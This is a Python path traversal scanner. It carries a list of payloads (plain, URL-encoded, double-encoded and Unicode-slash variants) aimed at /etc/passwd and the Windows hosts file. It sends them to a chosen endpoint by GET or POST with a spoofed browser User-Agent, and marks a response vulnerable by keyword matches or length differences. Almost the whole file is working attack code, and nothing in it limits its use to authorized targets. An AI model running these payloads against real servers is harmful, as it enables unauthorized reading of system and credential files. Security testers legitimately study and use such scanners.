import requests
from urllib.parse import quote
import time

payloads = [
    "etc/passwd",
    "../etc/passwd",
    "../../etc/passwd",
    "../../../../etc/passwd",
    "../////etc////passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252Fetc%252Fpasswd",  # double URL-encoded
    "....//....//etc/passwd",        # double dot bypass
    "..%c0%afetc%c0%afpasswd",       # Unicode encoded slash
    "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
    "..%5C..%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts",
    "C:/Windows/System32/drivers/etc/hosts"
]

default_keywords = ["root:", "/bin/bash", "[boot loader]", "localhost"]

def is_sensitive(response_text, keywords):
    found = False
    words = response_text.split()
    for i in words:
        if i in keywords:
            found=True
            break
    return found    

def check_path_traversal(domain, vuln_endpoint, method, keywords=None):
    if keywords is None:
        keywords = default_keywords

    base_url = domain.rstrip('/') + vuln_endpoint
    results = []
    
    try:
        base = requests.get(base_url + "random_file", timeout=5).text
    except:
        base = ""

    for payload in payloads:
        full_url = f"{base_url}{payload}"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Referer": domain
        }

        try:
            if method.upper() == "POST":
                response = requests.post(base_url, data={"file": payload}, headers=headers, timeout=7)
            else:
                response = requests.get(full_url, headers=headers, timeout=7)
            
            snippet = response.text[:300]
            status = response.status_code
            length_diff = abs(len(response.text) - len(base))

            if status == 200 and (is_sensitive(response.text, keywords) or length_diff > 100):
                results.append({
                    "payload": payload,
                    "url": full_url,
                    "vulnerable": True,
                    "snippet": snippet
                })
            else:
                results.append({
                    "payload": payload,
                    "url": full_url,
                    "vulnerable": False,
                    "status_code": status
                })

        except requests.exceptions.RequestException as e:
            results.append({
                "payload": payload,
                "url": full_url,
                "error": str(e),
                "vulnerable": False
            })

    return results